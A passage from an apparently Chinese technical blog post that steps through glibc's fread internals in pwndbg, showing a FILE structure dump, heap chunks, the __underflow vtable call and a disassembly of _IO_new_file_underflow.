-72539004,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_buf_base</code>以及<code>_IO_buf_end</code>已经被正确设置了<br>我们再查看堆，发现确实分配了0x1000大小的缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555a4b0</span><br><span class="line">Size: 0x1fb50 (with flag bits: 0x1fb51)</span><br></pre></td></tr></table></figure><p>之后<code>_IO_file_xsgetn</code>检查读缓冲区，发现<code>fp-&gt;_IO_read_ptr</code>&#x3D;&#x3D; <code>fp-&gt;_IO_read_end</code>，读缓冲区为空，则调用<code>__underflow</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8b430 &lt;__GI__IO_file_xsgetn+384&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8b433 &lt;__GI__IO_file_xsgetn+387&gt;    call   __underflow                 &lt;__underflow&gt;</span><br></pre></td></tr></table></figure><p>而<code>__underflow</code>函数正是调用了<code>vtable-&gt;_IO_file_underflow</code>函数（<code>[_IO_file_jumps+32]</code>便是）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d8f1 &lt;__underflow+129&gt;          mov    rax, qword ptr [rbx + 0x20]     RAX, [_IO_file_jumps+32] =&gt; 0x7ffff7c8cab0 (_IO_file_underflow) ◂— endbr64</span><br><span class="line">0x7ffff7c8d8f5 &lt;__underflow+133&gt;          add    rsp, 8                          RSP =&gt; 0x7fffffffdc38 (0x7fffffffdc30 + 0x8)</span><br><span class="line">0x7ffff7c8d8f9 &lt;__underflow+137&gt;          mov    rdi, rbp                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad2484</span><br><span class="line">0x7ffff7c8d8fc &lt;__underflow+140&gt;          pop    rbx                             RBX =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8d8fd &lt;__underflow+141&gt;          pop    rbp                             RBP =&gt; 0</span><br><span class="line">0x7ffff7c8d8fe &lt;__underflow+142&gt;          jmp    rax                         &lt;_IO_file_underflow&gt;</span><br></pre></td></tr></table></figure><p>放上<code>vtable-&gt;_IO_file_underflow</code>的汇编<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_underflow:</span><br><span class="line">Address range 0x7ffff7c8cab0 to 0x7ffff7c8cdb9:</span><br><span class="line">=&gt; 0x00007ffff7c8cab0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8cab4 &lt;+4&gt;:     mov    eax,DWORD PTR [rdi]</span><br><span class="line">   0x00007ffff7c8cab6 &lt;+6&gt;:     test   al,0x10</span><br><span class="line">   0x00007ffff7c8cab8 &lt;+8&gt;:     jne    0x7ffff7c8cd88 &lt;_IO_new_file_underflow+728&gt;</span><br><span class="line">   0x00007ffff7c8cabe &lt;+14&gt;:    push   r15</span><br><span class="line">   0x00007ffff7c8cac0 &lt;+16&gt;:    push   r14</span><br><span class="line">   0x00007ffff7c8cac2 &lt;+18&gt;:    push   r13</span><br><span class="line">   0x00007ffff7c8cac4 &lt;+20&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8cac6 &lt;+22&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8cac7 &lt;+23&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8cac8 &lt;+24&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8cacb &lt;+27&gt;:    sub    rsp,0x18</span><br><span class="line">   0x00007ffff7c8cacf &lt;+31&gt;:    test   al,0x4</span><br><span class="line">   0x00007ffff7c8cad1 &lt;+33&gt;:    jne    0x7ffff7c8cd90 &lt;_IO_new_file_underflow+736&gt;</span><br><span class="line">   0x00007ffff7c8cad7 &lt;+39&gt;:    mov    rdx,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x00007ffff7c8cadb &lt;+43&gt;:    cmp    rdx,QWORD PTR [rdi+0x10]</span><br><span class="line">   0x00007ffff7c8cadf &lt;+47&gt;:    jb     0x7ffff7c8cc70 &lt;_IO_new_file_underflow+448&gt;</span><br><span class="line">   0x00007ffff7c8cae5 &lt;+53&gt;:    cmp    QWORD PTR [rdi+0x38],0x0</span><br><span class="line">   0x00007ffff7c8caea &lt;+58&gt;:    je     0x7ffff7c8ccc0 &lt;_IO_new_file_underflow+528&gt;</span><br><span class="line">   0x00007ffff7c8caf0 &lt;+64&gt;:    test   eax,0x202</span><br><span class="line">   0x00007ffff7c8caf5 &lt;+69&gt;:    je     0x7ffff7c8cbd2 &lt;_IO_new_file_underflow+290&gt;</span><br><span class="line">   0x00007ffff7c8cafb &lt;+75&gt;:    mov    rax,QWORD PTR [rip+0x18d336]        # 0x7ffff7e19e38</span><br><span class="line">   0x00007ffff7c8cb02 &lt;+82&gt;:    mov    r12,QWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cb05 &lt;+85&gt;:    mov    edx,DWORD PTR [r12]</span><br><span class="line">   0x00007ffff7c8cb09 &lt;+89&gt;:    mov    eax,edx</span><br><span class="line">   0x00007ffff7c8cb0b &lt;+91&gt;:    and    eax,0x8000</span><br><span class="line">   0x00007ffff7c8cb10 &lt;+96&gt;:    jne    0x7ffff7c8cbc0 &lt;_IO_new_file_underflow+272&gt;</span><br><span class="line">   0x00007ffff7c8cb16 &lt;+102&gt;:   mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8cb1e &lt;+110&gt;:   mov    rbp,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c8cb27 &lt;+119&gt;:   cmp    QWORD PTR [rdi+0x8],rbp</span><br><span class="line">   0x00007ffff7c8cb2b &lt;+123&gt;:   je     0x7ffff7c8ccf0 &lt;_IO_new_file_underflow+576&gt;</span><br><span class="line">   0x00007ffff7c8cb31 &lt;+129&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8cb36 &lt;+134&gt;:   lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c8cb3a &lt;+138&gt;:   jne    0x7ffff7c8cd78 &lt;_IO_new_file_underflow+712&gt;</span><br><span class="line">   0x00007ffff7c8cb40 &lt;+144&gt;:   mov    rax,QWORD PTR [rip+0x18d2f1]        # 0x7ffff7e19e38</span><br><span class="line">   0x00007ffff7c8cb47 &lt;+151&gt;:   mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8cb4f &lt;+159&gt;:   mov    r8,QWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cb52 &lt;+162&gt;:   mov    QWORD PTR [rdi+0x8],rbp</span><br><span class="line">   0x00007ffff7c8cb56 &lt;+166&gt;:   mov    edx,DWORD PTR [r8]</span><br><span class="line">   0x00007ffff7c8cb59 &lt;+169&gt;:   and    edx,0x288</span><br><span class="line">   0x00007ffff7c8cb5f &lt;+175&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8cb63 &lt;+179&gt;:   cmp    edx,0x280</span><br><span class="line">   0x00007ffff7c8cb69 &lt;+185&gt;:   je     0x7ffff7c8cd03 &lt;_IO_new_file_underflow+595&gt;</span><br><span class="line">   0x00007ffff7c8cb6f &lt;+191&gt;:   lea    r15,[rip+0x18abf2]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8cb76 &lt;+198&gt;:   lea    rbp,[rip+0x189e83]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cb7d &lt;+205&gt;:   mov    r13,r15</span><br><span class="line">   0x00007ffff7c8cb80 &lt;+208&gt;:   mov    r14,rbp</span><br><span class="line">   0x00007ffff7c8cb83 &lt;+211&gt;:   sub    r13,rbp</span><br><span class="line">   0x00007ffff7c8cb86 &lt;+214&gt;:   test   DWORD PTR [r12],0x8000</span><br><span class="line">   0x00007ffff7c8cb8e &lt;+222&gt;:   jne    0x7ffff7c8cbe0 &lt;_IO_new_file_underflow+304&gt;</span><br><span class="line">   0x00007ffff7c8cb90 &lt;+224&gt;:   mov    rdi,QWORD PTR [r12+0x88]</span><br><span class="line">   0x00007ffff7c8cb98 &lt;+232&gt;:   mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c8cb9b &lt;+235&gt;:   sub    eax,0x1</span><br><span class="line">   0x00007ffff7c8cb9e &lt;+238&gt;:   mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c8cba1 &lt;+241&gt;:   jne    0x7ffff7c8cbe0 &lt;_IO_new_file_underflow+304&gt;</span><br><span class="line">   0x00007ffff7c8cba3 &lt;+243&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c8cbab &lt;+251&gt;:   xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8cbad &lt;+253&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c8cbb0 &lt;+256&gt;:   jle    0x7ffff7c8cbe0 &lt;_IO_new_file_underflow+304&gt;</span><br><span class="line">   0x00007ffff7c8cbb2 &lt;+258&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8cbb7 &lt;+263&gt;:   jmp    0x7ffff7c8cbed &lt;_IO_new_file_underflow+317&gt;</span><br><span class="line">   0x00007ffff7c8cbb9 &lt;+265&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cbc0 &lt;+272&gt;:   and    edx,0x288</span><br><span class="line">   0x00007ffff7c8cbc6 &lt;+278&gt;:   cmp    edx,0x280</span><br><span class="line">   0x00007ffff7c8cbcc &lt;+284&gt;:   je     0x7ffff7c8cd00 &lt;_IO_new_file_underflow+592&gt;</span><br><span class="line">   0x00007ffff7c8cbd2 &lt;+290&gt;:   lea    r15,[rip+0x18ab8f]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8cbd9 &lt;+297&gt;:   lea    rbp,[rip+0x189e20]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cbe0 &lt;+304&gt;:   sub    r15,rbp</span><br><span class="line">   0x00007ffff7c8cbe3 &lt;+307&gt;:   lea    r14,[rip+0x189e16]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cbea &lt;+314&gt;:   mov    r13,r15</span><br><span class="line">   0x00007ffff7c8cbed &lt;+317&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8cbf0 &lt;+320&gt;:   call   0x7ffff7c8d720 &lt;__GI__IO_switch_to_get_mode&gt;</span><br><span class="line">   0x00007ffff7c8cbf5 &lt;+325&gt;:   movdqu xmm0,XMMWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8cbfa &lt;+330&gt;:   mov    rbp,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8cc01 &lt;+337&gt;:   movdqa xmm1,xmm0</span><br><span class="line">   0x00007ffff7c8cc05 &lt;+341&gt;:   mov    rax,rbp</span><br><span class="line">   0x00007ffff7c8cc08 &lt;+344&gt;:   movq   rsi,xmm0</span><br><span class="line">   0x00007ffff7c8cc0d &lt;+349&gt;:   punpcklqdq xmm1,xmm0</span><br><span class="line">   0x00007ffff7c8cc11 &lt;+353&gt;:   sub    rax,r14</span><br><span class="line">   0x00007ffff7c8cc14 &lt;+356&gt;:   movups XMMWORD PTR [rbx+0x8],xmm1</span><br><span class="line">   0x00007ffff7c8cc18 &lt;+360&gt;:   movups XMMWORD PTR [rbx+0x18],xmm1</span><br><span class="line">   0x00007ffff7c8cc1c &lt;+364&gt;:   movups XMMWORD PTR [rbx+0x28],xmm1</span><br><span class="line">   0x00007ffff7c8cc20 &lt;+368&gt;:   cmp    rax,r13</span><br><span class="line">   0x00007ffff7c8cc23 &lt;+371&gt;:   jae    0x7ffff7c8cd48 &lt;_IO_new_file_underflow+664&gt;</span><br><span class="line">   0x00007ffff7c8cc29 &lt;+377&gt;:   mov    rdx,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8cc2d &lt;+381&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8cc30 &lt;+384&gt;:   sub    rdx,rsi</span><br><span class="line">   0x00007ffff7c8cc33 &lt;+387&gt;:   call   QWORD PTR [rbp+0x70]</span><br><span class="line">   0x00007ffff7c8cc36 &lt;+390&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8cc39 &lt;+393&gt;:   jle    0x7ffff7c8cc88 &lt;_IO_new_file_underflow+472&gt;</span><br><span class="line">   0x00007ffff7c8cc3b &lt;+395&gt;:   mov    rdx,QWORD PTR [rbx+0x90]</span><br><span class="line">   0x00007ffff7c8cc42 &lt;+402&gt;:   add    QWORD PTR [rbx+0x10],rax</span><br><span class="line">   0x00007ffff7c8cc46 &lt;+406&gt;:   cmp    rdx,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8cc4a &lt;+410&gt;:   je     0x7ffff7c8cc56 &lt;_IO_new_file_underflow+422&gt;</span><br><span class="line">   0x00007ffff7c8cc4c &lt;+412&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8cc4f &lt;+415&gt;:   mov    QWORD PTR [rbx+0x90],rdx</span><br><span class="line">   0x00007ffff7c8cc56 &lt;+422&gt;:   mov    rax,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7c8cc5a &lt;+426&gt;:   movzx  eax,BYTE PTR [rax]</span><br><span class="line">   0x00007ffff7c8cc5d &lt;+429&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8cc61 &lt;+433&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8cc62 &lt;+434&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8cc63 &lt;+435&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8cc65 &lt;+437&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8cc67 &lt;+439&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8cc69 &lt;+441&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8cc6b &lt;+443&gt;:   ret</span><br><span class="line">   0x00007ffff7c8cc6c &lt;+444&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cc70 &lt;+448&gt;:   movzx  eax,BYTE PTR [rdx]</span><br><span class="line">   0x00007ffff7c8cc73 &lt;+451&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8cc77 &lt;+455&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8cc78 &lt;+456&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8cc79 &lt;+457&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8cc7b &lt;+459&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8cc7d &lt;+461&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8cc7f &lt;+463&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8cc81 &lt;+465&gt;:   ret</span><br><span class="line">   0x00007ffff7c8cc82 &lt;+466&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cc88 &lt;+472&gt;:   mov    QWORD PTR [rbx+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8cc93 &lt;+483&gt;:   mov    edx,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8cc95 &lt;+485&gt;:   mov    ecx,edx</span><br><span class="line">   0x00007ffff7c8cc97 &lt;+487&gt;:   or     edx,0x20</span><br><span class="line">   0x00007ffff7c8cc9a &lt;+490&gt;:   or     ecx,0x10</span><br><span class="line">   0x00007ffff7c8cc9d &lt;+493&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c8cca0 &lt;+496&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8cca5 &lt;+501&gt;:   cmove  edx,ecx</span><br><span class="line">   0x00007ffff7c8cca8 &lt;+504&gt;:   mov    DWORD PTR [rbx],edx</span><br><span class="line">   0x00007ffff7c8ccaa &lt;+506&gt;:   add    rsp,0x18</span><br><span class="line">   0x00007ffff7c8ccae &lt;+510&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ccaf &lt;+511&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8ccb0 &lt;+512&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8ccb2 &lt;+514&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8ccb4 &lt;+516&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8ccb6 &lt;+518&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8ccb8 &lt;+520&gt;:   ret</span><br><span class="line">   0x00007ffff7c8ccb9 &lt;+521&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8ccc0 &lt;+528&gt;:   mov    rdi,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x00007ffff7c8ccc4 &lt;+532&gt;:   test   rdi,rdi</span><br><span class="line">   0x00007ffff7c8ccc7 &lt;+535&gt;:   je     0x7ffff7c8ccd4 &lt;_IO_new_file_underflow+548&gt;</span><br><span class="line">   0x00007ffff7c8ccc9 &lt;+537&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c8ccce &lt;+542&gt;:   and    DWORD PTR [rbx],0xfffffeff</span><br><span class="line">   0x00007ffff7c8ccd4 &lt;+548&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8ccd7 &lt;+551&gt;:   call   0x7ffff7c8dc90 &lt;__GI__IO_doallocbuf&gt;</span><br><span class="line">   0x00007ffff7c8ccdc &lt;+556&gt;:   mov    eax,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8ccde &lt;+558&gt;:   test   eax,0x202</span><br><span class="line">   0x00007ffff7c8cce3 &lt;+563&gt;:   jne    0x7ffff7c8cafb &lt;_IO_new_file_underflow+75&gt;</span><br><span class="line">   0x00007ffff7c8cce9 &lt;+569&gt;:   jmp    0x7ffff7c8cbd2 &lt;_IO_new_file_underflow+290&gt;</span><br><span class="line">   0x00007ffff7c8ccee &lt;+574&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8ccf0 &lt;+576&gt;:   mov    r8,r12</span><br><span class="line">   0x00007ffff7c8ccf3 &lt;+579&gt;:   jmp    0x7ffff7c8cb59 &lt;_IO_new_file_underflow+169&gt;</span><br><span class="line">   0x00007ffff7c8ccf8 &lt;+584&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd00 &lt;+592&gt;:   mov    r8,r12</span><br><span class="line">   0x00007ffff7c8cd03 &lt;+595&gt;:   mov    rax,QWORD PTR [r8+0xd8]</span><br><span class="line">   0x00007ffff7c8cd0a &lt;+602&gt;:   lea    r15,[rip+0x18aa57]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8cd11 &lt;+609&gt;:   lea    rbp,[rip+0x189ce8]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8cd18 &lt;+616&gt;:   mov    r13,r15</span><br><span class="line">   0x00007ffff7c8cd1b &lt;+619&gt;:   mov    r14,rbp</span><br><span class="line">   0x00007ffff7c8cd1e &lt;+622&gt;:   mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x00007ffff7c8cd23 &lt;+627&gt;:   sub    r13,rbp</span><br><span class="line">   0x00007ffff7c8cd26 &lt;+630&gt;:   sub    rax,rbp</span><br><span class="line">   0x00007ffff7c8cd29 &lt;+633&gt;:   cmp    r13,rax</span><br><span class="line">   0x00007ffff7c8cd2c &lt;+636&gt;:   jbe    0x7ffff7c8cd60 &lt;_IO_new_file_underflow+688&gt;</span><br><span class="line">   0x00007ffff7c8cd2e &lt;+638&gt;:   mov    rax,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7c8cd33 &lt;+643&gt;:   mov    esi,0xffffffff</span><br><span class="line">   0x00007ffff7c8cd38 &lt;+648&gt;:   mov    rdi,r8</span><br><span class="line">   0x00007ffff7c8cd3b &lt;+651&gt;:   call   QWORD PTR [rax+0x18]</span><br><span class="line">   0x00007ffff7c8cd3e &lt;+654&gt;:   jmp    0x7ffff7c8cb86 &lt;_IO_new_file_underflow+214&gt;</span><br><span class="line">   0x00007ffff7c8cd43 &lt;+659&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd48 &lt;+664&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8cd4d &lt;+669&gt;:   mov    rsi,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8cd51 &lt;+673&gt;:   jmp    0x7ffff7c8cc29 &lt;_IO_new_file_underflow+377&gt;</span><br><span class="line">   0x00007ffff7c8cd56 &lt;+678&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8cd60 &lt;+688&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8cd65 &lt;+693&gt;:   mov    rax,QWORD PTR [rip+0x18d0cc]        # 0x7ffff7e19e38</span><br><span class="line">   0x00007ffff7c8cd6c &lt;+700&gt;:   mov    r8,QWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8cd6f &lt;+703&gt;:   jmp    0x7ffff7c8cd2e &lt;_IO_new_file_underflow+638&gt;</span><br><span class="line">   0x00007ffff7c8cd71 &lt;+705&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8cd78 &lt;+712&gt;:   call   